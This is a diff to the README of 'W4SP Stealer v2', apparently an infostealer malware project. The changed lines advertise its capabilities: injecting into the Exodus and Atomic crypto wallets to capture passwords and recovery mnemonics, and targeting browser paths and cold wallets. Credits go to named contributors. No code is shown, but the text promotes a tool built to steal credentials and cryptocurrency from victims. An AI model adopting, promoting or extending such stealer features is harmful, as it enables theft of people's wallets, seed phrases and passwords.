@@ -32,8 +32,8 @@ W4SP Stealer v2 | W4SP API v2 | W4SP Bot v2
 ## Features [Stealer]
 (Stealer v2 by [@loTus04](https://github.com/loTus04) and [xKian](https://github.com/xKiian))
 
-Added: <br> <br>
-  &emsp; [+] Exodus Password Injection <br>
+Added (From v1): <br> <br>
+  &emsp; [+] Exodus Password + Mnemonic Injection -> Credit to [@dropout1337](https://github.com/dropout1337)<br>
   &emsp; [+] Atomic Password Injection <br>
   &emsp; [+] 10 Browser Paths <br>
   &emsp; [+] 7 Cold Wallets <br>
